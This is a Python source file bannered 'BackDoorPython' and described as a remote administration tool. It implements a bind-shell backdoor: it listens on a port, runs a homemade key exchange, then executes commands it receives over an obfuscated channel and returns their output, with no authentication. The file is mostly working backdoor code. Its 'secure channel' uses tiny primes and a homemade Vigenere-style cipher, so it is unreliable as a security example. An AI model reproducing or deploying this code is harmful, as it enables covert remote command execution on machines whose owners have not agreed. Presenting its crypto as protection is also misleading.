################################################################################
#______            _   ______                ______      _   _                 #   
#| ___ \          | |  |  _  \               | ___ \    | | | |                # 
#| |_/ / __ _  ___| | _| | | |___   ___  _ __| |_/ /   _| |_| |__   ___  _ __  # 
#| ___ \/ _` |/ __| |/ / | | / _ \ / _ \| '__|  __/ | | | __| '_ \ / _ \| '_ \ # 
#| |_/ / (_| | (__|   <| |/ / (_) | (_) | |  | |  | |_| | |_| | | | (_) | | | |# 
#\____/ \__,_|\___|_|\_\___/ \___/ \___/|_|  \_|   \__, |\__|_| |_|\___/|_| |_|# 
#                                                   __/ |                      # 
#                                                  |___/                       #
################################################################################
# This is a remote administration tool                                         #
################################################################################
import socket,os,subprocess,threading,time,queue,random,re,sys,hashlib
################################################################################
# Now putting in the functions needed
################################################################################
# Diffie Hellman - These are used to generate the shared key
def dh_phase1(p,g,cp):
    rlist = [7,11,13,17,19,23,29,31,29,37,41,43,47,43,47,53,59,61,67,71,73,79,83,89,97,101,103,107,109,113,127,131,137,139,149,151,157,163,167,173,179,181,191,193,197,199]
    sharedexchangeG = int(g)
    sharedexchangeP = int(p)
    clientprivatenumber = int(cp)
    clientpublickey = (sharedexchangeG**clientprivatenumber) % sharedexchangeP
    return  clientpublickey
def dh_phase2(p,publkey,privkey):
    sharedsecretclient = (publkey**privkey) % p
    return sharedsecretclient
################################################################################
# Now Bringing the modified hybrid Vignere Cipher
def encryptstring(inputstring,password,pincode):
    '''
    TLDR - example use....
    encryptstring('plaintext','mypassword',1234)

    The plaintext entered must be a string or string object!!!
    The password you enter must be a string too
    The pincode you enter must be numbers only!!
    '''
    try:
        # Converting the input provided to binary encoded strings
        password = (str(password)).encode()
        hashedpassword = hashlib.sha256(password).hexdigest()
        inputstring = (str(inputstring)).encode()
        encryptedstring = ''.encode()    
        # Creating the pincode list using list comprehension
        pincodelist = [ i for i in str(pincode)]
        # Now setting up the rotation based upon the pin
        for d in range(len(pincodelist)):
            if d != 0:
                inputstring = encryptedstring
                encryptedstring = ''.encode()
            # Now shifting the values of the plaintext string
            for x in range(len(inputstring)):
                # Grabbing the hashed value
                hashediter = ord(hashedpassword[(x % 64)])
                # Now performing the calculation
                modulusvalue = ((inputstring[x]) + int(pincodelist[d]) + hashediter) % 127
                # Now adding the value to the encrypted string
                encryptedletter = (str(chr(modulusvalue))).encode()
                encryptedstring = encryptedstring + encryptedletter
    except:
        encryptedstring = 'There was an error, please check you input'
        pass
    return encryptedstring

def decryptstring(inputstring,password,pincode):
    '''
    TLDR - example use....
    decryptstring('plaintext','mypassword',1234)
    or
    decryptstring(plaintext,'mypassword',1234)

    The plaintext entered must be a string or binary string object!!!
    The password you enter must be a string too
    The pincode you enter must be numbers only!!
    '''
    try:
        # Converting the input provided to binary encoded strings
        password = (str(password)).encode()
        if str(type(inputstring)) != "<class 'bytes'>":
            inputstring = (str(inputstring)).encode()
        hashedpassword = hashlib.sha256(password).hexdigest()
        decryptedstring = ''.encode()
        # Creating the pincode list using list comprehension
        pincodelist = [ i for i in str(pincode)]
        # Now reversing the order of the pin list
        pincodelist = pincodelist[::-1]
        # Now setting up the rotation based upon the pin
        for d in range(len(pincodelist)):
            if d != 0:
                inputstring = decryptedstring
                decryptedstring = ''.encode()
            # Now shifting the values of the ciphertext string
            for x in range(len(inputstring)):
                # Grabbing the hashed value
                hashediter = ord(hashedpassword[(x % 64)])
                # Now performing the calculation
                charvalue = ((inputstring[x] + 127) - hashediter) - int(pincodelist[d])
                if charvalue > 127:
                    charvalue = charvalue - 127
                # Now adding the decrypt char to the decrypted string
                decryptedletter = (str(chr(charvalue))).encode()
                decryptedstring += decryptedletter
    except:
        decryptedstring = 'There was an error, please check you input'
        pass
    return decryptedstring

def pincode(password):
    pin = password[-1::-10]
    pincode = ''
    for i in pin:
        pincode += str(i)
    return int(pincode)
################################################################################
# Now importing the multi-threading options and cmd line input
def qthreader():
    while True:
        worker = q.get()
def threaded(c):
    while True:
        data = c.recv(4096)
        command = data.decode('UTF-8')
        command = str(data.decode('UTF-8'))
        command = decryptstring(command,pycipherpass,encrpin)
        command = command.decode()
        output = systemcmd(str(command))
        output = encryptstring(output,pycipherpass,encrpin)
        output = output.decode()
        c.sendall(bytes(str(output),'UTF-8'))
def systemcmd(cmd):
    cmd_output = subprocess.getoutput(str(cmd))
    return cmd_output
################################################################################
# Now setting up the secure channel function
def securechannel():
    host = ''
    port = 58465
    sec = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sec.bind((host, port))
    print("socket binded to post", port)
    sec.listen(5)
    print("socket is listening")
    while True:
        c, addr = sec.accept()
        print('Connected to :', addr[0], ':', addr[1])
        threadedconnections = threading.Thread(target=threaded, args=(c,))
        threadedconnections.start()
    sec.close()
# Done importing the functions to setup the channel
################################################################################
# Now running the server
host = ''
port = 58365
rlist = [7,11,13,17,19,23,29,31,29,37,41,43,47,43,47,53,59,61,67,71,73,79,83,89,97,101,103,107,109,113,127,131,137,139,149,151,157,163,167,173,179,181,191,193,197,199]
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(5)
c, addr = s.accept()
while True:
    data = c.recv(4096)
    command = data.decode('UTF-8')
    # Now starting by sending the prime numbers
    if command == 'hellofriend':
        p = []
        for i in range(50):
            p.append((random.choices(rlist)[0]))
        output = str(p)
        c.sendall(bytes(output,'UTF-8'))
        print('hellofriend')
    # Now sending the group numbers
    elif command == 'Nowawaiting G':
        g = [] 
        for i in range(50):
            g.append((random.choices(rlist)[0]))
        output = str(g)
        c.sendall(bytes(output,'UTF-8'))
        print('like a G')
    # Now exchanging public keys
    elif (re.match(r"^publickeys",str(command))) != None:
        publickeys = str(command).split(':')[1]
        publickeys = (publickeys.strip('[')).strip("]'")
        publickeys = publickeys.split(',')
        # NOw generating the public kets from the server    
        clientpublickey = []
        clientprivatenumberlist = []
        for i in range(50):
            clientprivatenumberlist.append((random.choices(rlist)[0]))
            cp = clientprivatenumberlist[i]
            publickey = dh_phase1(p[i],g[i],cp)
            clientpublickey.append(publickey)
        clientpublickey = str(clientpublickey)
        output = clientpublickey
        print(output)
        c.sendall(bytes(output,'UTF-8'))
        # NOw perform the second phase of DH2
        password = []
        for i in range(50):
            pnumber = p[i]
            pbkey = publickeys[i]
            pvkey = clientprivatenumberlist[i]
            password.append(dh_phase2(int(pnumber),int(pbkey),int(pvkey)))
        print('key swapping')
    elif command == 'MoveTo443':
        print('Matched on 443')
        encrpin = pincode(password)
        pycipherpass = ''
        for i in password:
            pycipherpass += str(i) 
        print_lock = threading.Lock()
        securechannel()
        break

